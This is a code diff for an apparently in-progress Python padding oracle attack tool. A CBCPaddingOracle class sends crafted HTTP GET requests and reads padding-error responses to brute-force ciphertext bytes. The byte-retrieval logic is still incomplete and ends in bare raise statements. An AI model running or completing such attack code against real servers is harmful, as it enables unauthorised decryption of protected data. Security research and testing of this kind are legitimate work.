@@ -59,13 +59,28 @@ class CBCPaddingOracle(HTTPLeaker):
             elif padding_error:
                 self.logger.info('padding starts at offset %d' % (self.block_offset(self.blocks_number - 2) + self.state['idx']))
                 self.state['state'] = self.State.BYTE_RETRIEVAL
-                self.state['idx']   = 0 # this index is from the tail of the string
-                raise
+                self.state['idx']   = self.state['block_length'] - self.state['idx'] # this index is from the tail of the string
+                self.state['mask']  = '\x00' * len(self.ciphertext) # we create a mask that will xor the original ciphertext
+                self.state['mask_byte'] = '\x01' # this is the first try
             elif success:
                 raise ValueError('this is bad my friend')
 
+        # now we are trying to bruteforce the padding bytes: we are starting with a know padding
+        # from the previous stage and then XORing one byte at the times incrementally
+        # when we reach the 'file not found message' means we have guessed right one byte.
         elif state == self.State.BYTE_RETRIEVAL:
-            raise
+            if padding_error:
+                # try another byte
+                b = ord(self.state['mask_byte']) + 1
+
+                if b > 0xff:
+                    raise ValueError('You exceeded the allowed values')
+
+                self.state['mask_byte'] = chr(b)
+                raise
+            elif file:
+                pass
+
 
     def get_requests_method(self):
         return 'GET'
@@ -95,6 +110,9 @@ class CBCPaddingOracle(HTTPLeaker):
             #import ipdb;ipdb.set_trace()
             idx = (self.block_offset(self.blocks_number - 2) + self.state['idx'])
             ciphertext= ciphertext[:idx] + '0' + ciphertext[idx + 1:]
+        elif self.state['state'] == self.State.BYTE_RETRIEVAL:
+            self.logger.info('probing %d-th byte' % self.state['idx'])
+            raise
 
         return {
             'c': hexify(ciphertext),
